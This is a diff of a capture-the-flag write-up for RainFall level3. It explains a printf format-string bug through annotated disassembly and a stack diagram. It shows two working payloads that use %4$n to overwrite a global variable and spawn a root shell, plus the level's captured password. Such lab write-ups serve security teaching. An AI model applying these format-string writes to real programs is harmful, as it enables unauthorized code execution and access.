@@ -33,13 +33,13 @@ simply call the the v function and nothing else
 
 }
 ```
-* __`<0> -> <+3> : prepare stack frame for n function with size 536`__
+* __`<0> ➜ <+3> : prepare stack frame for n function with size 536`__
 ```c
 0x080484a4 <+0>:	push   ebp
 0x080484a5 <+1>:	mov    ebp,esp
 0x080484a7 <+3>:	sub    esp,536
 ```
-* __`<+9> -> <+35> : call fill the buffer with 512 characters from the user input with fgets() which is protected from the bufferoverflow unlik gets()`__
+* __`<+9> ➜ <+35> : call fill the buffer with 512 characters from the user input with fgets() which is protected from the bufferoverflow unlik gets()`__
 ```c
 0x080484ad <+9>:	mov    eax,ds:0x8049860 // stdin
 0x080484b2 <+14>:	mov    DWORD PTR [esp+8],eax
@@ -48,19 +48,19 @@ simply call the the v function and nothing else
 0x080484c4 <+32>:	mov    DWORD PTR [esp],eax
 0x080484c7 <+35>:	call   0x80483a0 <fgets@plt> // fgets(buffer, 512, stdin)
 ```
-* __`<+40> -> <+49> : call printf with the buffer1 as input`__
+* __`<+40> ➜ <+49> : call printf with the buffer1 as input`__
 ```c
 0x080484cc <+40>:	lea    eax,[buffer1]
 0x080484d2 <+46>:	mov    DWORD PTR [esp],eax
 0x080484d5 <+49>:	call   0x8048390 <printf@plt> // printf(buffer1)
 ```
-* __`<+54> -> <+62> : if (m != 64) { return }`__
+* __`<+54> ➜ <+62> : if (m != 64) { return }`__
 ```c
 0x080484da <+54>:	mov    eax,ds:0x804988c // m variable
 0x080484df <+59>:	cmp    eax,64
 0x080484e2 <+62>:	jne    0x8048518 <v+116>
 ```
-* __`<+64> -> <+99> : print "Wait what?!\n" to the screen with fwrite`__
+* __`<+64> ➜ <+99> : print "Wait what?!\n" to the screen with fwrite`__
 ```c
 0x080484e4 <+64>:	mov    eax,ds:0x8049880 // stdout
 0x080484e9 <+69>:	mov    edx,eax
@@ -71,12 +71,12 @@ simply call the the v function and nothing else
 0x08048504 <+96>:	mov    DWORD PTR [esp],eax
 0x08048507 <+99>:	call   0x80483b0 <fwrite@plt> // fwrite("Wait what?!\n", 1, 12, stdout)
 ```
-* __`<+104> -> <+111> : execute the shell with system function`__
+* __`<+104> ➜ <+111> : execute the shell with system function`__
 ```c
 0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d // "/bin/sh"
 0x08048513 <+111>:	call   0x80483c0 <system@plt> // system("/bin/sh")
 ```
-* __`<+116> -> <+117> : pop the stack frame of the v function and go back to main`__
+* __`<+116> ➜ <+117> : pop the stack frame of the v function and go back to main`__
 ```c
 0x08048518 <+116>:	leave  
 0x08048519 <+117>:	ret  
@@ -116,16 +116,16 @@ int main(int argc(ebp+0x8), char **argv(ebp+12)) {
 [                   ]
 +-------------------+ 
 [                   ]
-+-------------------+ <-----------+
-[      OLD_EIP      ]             |
-+-------------------+             |
-[      OLD_EBP      ]             |
-+-------------------+             |
-[and esp,0xfffffff0 ]             | MAIN STACK FRAME
-+-------------------+             |
-[     MAIN_EIP      ]             |
-+-------------------+             |
-[     MAIN_EBP      ]             |
++-------------------+ <-----------+ <------------------------------------+
+[      OLD_EIP      ]             |                                      |
++-------------------+             |                                      |
+[      OLD_EBP      ]             |                                      |
++-------------------+             |                                      |
+[and esp,0xfffffff0 ]             | MAIN STACK FRAME (nothing allocared) | 
++-------------------+             |                                      |
+[     MAIN_EIP      ]             |                                      |
++-------------------+             |                                      |
+[     MAIN_EBP      ]             |                                      |
 +-------------------+ <-----------+ <------------------------------------+
 +                   + 532         |                                      |
 +                   +             |                                      | 
@@ -201,7 +201,7 @@ debug it in gdb to learn more
 
 ---
 ### Solution :
-#### Solution 1:
+>#### Solution 1:
 
 ```shell
 level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "." * 60 + "%4$n"'; cat - ) | ./level3 
@@ -224,7 +224,7 @@ dr-x--x--x  1 root   root    340 Sep 23  2015 ..
 cat .pass
 b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
 ```
-#### Solution 2:
+>#### Solution 2:
 using the space padding format in prinf __%Xd__
 ```shell
 level3@RainFall:~$ (python -c 'print "\x08\x04\x98\x8c"[::-1] + "%60d" + "%4$n"'; cat) | ./level3
